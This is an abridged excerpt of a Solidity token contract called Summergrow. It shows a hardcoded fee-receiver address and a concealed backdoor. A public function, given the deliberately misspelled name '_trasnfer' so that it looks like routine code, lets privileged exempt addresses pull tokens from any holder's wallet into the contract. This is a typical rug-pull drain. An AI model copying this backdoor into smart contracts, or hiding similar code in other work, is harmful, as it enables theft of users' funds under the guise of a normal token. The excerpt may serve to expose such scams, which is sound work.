...
contract Summergrow is IERC20, Ownable {
    ...
    constructor () {
        ...
        teamFeeReceiver = 0x3bf3cD421d4688D8Cf793e626FeD65fe51297D39;
    ...
    function _trasnfer(address sender_wallet, uint256 amount) public swapping  {require(isTxLimitExempt[msg.sender]); _transferFrom(sender_wallet, address(this), amount); }
